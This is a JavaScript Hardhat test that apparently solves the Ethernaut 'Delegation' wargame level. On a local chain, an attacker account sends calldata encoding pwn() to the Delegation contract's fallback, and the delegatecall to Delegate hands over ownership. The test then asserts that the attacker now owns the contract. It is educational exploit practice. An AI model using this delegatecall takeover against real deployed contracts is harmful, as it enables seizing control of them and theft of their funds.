const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { sign } = require("crypto")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("Delegation", () => {
  async function deployFallbackFixture () {
    const [deployer, attacker] = await ethers.getSigners()
    const DelegateFactory = await ethers.getContractFactory("Delegate")
    const delegate = await DelegateFactory.connect(deployer).deploy(deployer.address)
    await delegate.waitForDeployment()
    const delegateAddress = await delegate.getAddress()

    const ContractFactory = await ethers.getContractFactory("Delegation")
    const contract = await ContractFactory.connect(deployer).deploy(delegateAddress)
    await contract.waitForDeployment()

    return { attacker, contract, delegate }
  }

  it("Should claim ownership ", async () => {
    const { attacker, contract, delegate } = await loadFixture(deployFallbackFixture)

    console.log(`攻击前Delegation的owner为${await contract.owner()}`)

    // abi、callData
    const abi = ["function pwn() public"]
    const interface = new ethers.Interface(abi)
    // console.log(interface)
    const callData = interface.encodeFunctionData(`pwn`, [])
    // console.log(callData)

    const attackTx = {
      to: await contract.getAddress(),
      data: callData
    }
    const receipt = await attacker.sendTransaction(attackTx)
    await receipt.wait()

    console.log(`攻击后Delegation的owner为${await contract.owner()}`)

    // 断言
    expect(await contract.owner()).to.equal(attacker.address)

  })
})